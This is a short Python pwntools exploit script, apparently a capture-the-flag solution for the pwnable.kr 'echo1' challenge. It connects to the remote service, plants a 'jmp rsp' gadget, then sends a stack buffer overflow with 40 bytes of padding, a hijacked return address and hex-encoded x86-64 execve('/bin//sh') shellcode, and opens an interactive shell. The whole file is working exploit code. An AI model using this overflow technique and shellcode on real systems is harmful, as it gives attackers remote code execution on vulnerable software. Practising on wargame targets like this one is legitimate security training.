#!/usr/bin/python
# -*- coding: utf-8 -*-
# @arthurpaixao
from pwn import *

# sh=process('/home/c/ctf/echo1')

sh = remote('pwnable.kr', 9010)
shellcode="\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"
sh.sendline(asm('jmp rsp', arch='amd64', os='linux'))
sh.sendline('1')
sh.sendline('A' * 40 + p64(0x6020A0) + shellcode)
sh.interactive()
